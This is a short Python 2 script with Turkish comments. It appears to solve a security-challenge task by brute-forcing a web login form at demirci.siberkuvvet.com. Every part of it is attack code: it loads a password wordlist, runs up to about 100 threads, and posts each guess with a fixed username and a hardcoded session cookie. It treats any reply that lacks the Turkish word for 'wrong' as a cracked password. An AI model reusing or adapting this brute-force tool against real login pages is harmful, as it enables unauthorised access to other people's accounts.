#!/usr/bin/env python
# -*- coding: utf-8 -*-
###########################################################################
# Maminin haydarı bitmiştir :D	               		                  #
# vatana millete hayırlı olsun 						  #
# headers kısmından headerı params kısmından gönderilcek argümanı	  #
# sınır kısmından aynı anda yapılacak deneme sayısını değiştirebilirsiniz #
###########################################################################

import threading
import httplib,urllib
import time
atla=900
sinir=100 # aktif bağlantı
zaman=120 #deneme süre sınırı sn cinsinden
hatali_mesaj="Yanl\xc4\xb1\xc5\x9f" #Yanlış kelimesine karşlık geliyor
headers = {"Content-type": "application/x-www-form-urlencoded",
            "Accept": "text/plain",
            "PHPSESSID":"92mrl72ide5vrag3ska87ouc50"}    
f = open("/home/user/word.txt", 'r')
def dene(sifre,):
	global bulundu # en püf nokta burda üstteki bi değişgene erişmek için global kulandım onun global bi değişgen olduğunu belirtiyor yoksa yeniden tanımlıyormuş python işte çok yordu beni bu :D 2 saat kadar 
	if bulundu:
		return 
	c = httplib.HTTPSConnection("demirci.siberkuvvet.com") #https bağlantısı adındanda anlaşılacağı üzere
	sifre=sifre.replace('\n','') # şifrelerin sonunda enter kodu olan 0a geliyordu onları temizlemek için
	#print "denenenen: "+sifre
	params = urllib.urlencode({'kullaniciBilgi': "0xfff000", 'parolaBilgi': sifre }) # giden parametreler
	print params
	c.request("POST", "/bf_afcdf1c574c2f80f52bd70ebd66969c9/",params ,headers) #post ediliş
	response = c.getresponse() #responları çekmek
	#print response.status, response.reason
	metin=response.read() #gelen metin
	if (-1 == metin.find('Yanl\xc4\xb1\xc5\x9f') ): #find -1 döndürüyorsa metniniz yok demektir döndürdüğü sayı metnin başlağı indistir
		print "BULDUM " + sifre +"\n"+ metin
		bulundu=True

bulundu=False
threads = list() #threadleri bir listede tutuyorum daha sonra erişebilmek için
i=0 #girceğim threadleri indisi
for j in range(atla): # basit bir atlama yöntemi :D seek gibi parametreleri niye araştırıym ki :D
	satir=f.readline()
while not bulundu:
	satir=f.readline()
	if ("" == satir): #C de f.eof() vardı olmayınca böyle yapmak durumunda kaldım satır sonunu izliyor
		print "Bitti"
		break
	if len(threads) >sinir : 			#Thread sınırlayıcı eğer sinir den fazla threads olmuşsa içlerine girerek bitmesini bekler
		threads[i].join()
		i+=1
	x = threading.Thread(target=dene, args=(satir,)) #thread oluşturdu
	threads.append(x) #listemize thread ekledi
	x.start() #threadı başlattı
	time.sleep(zaman)
	



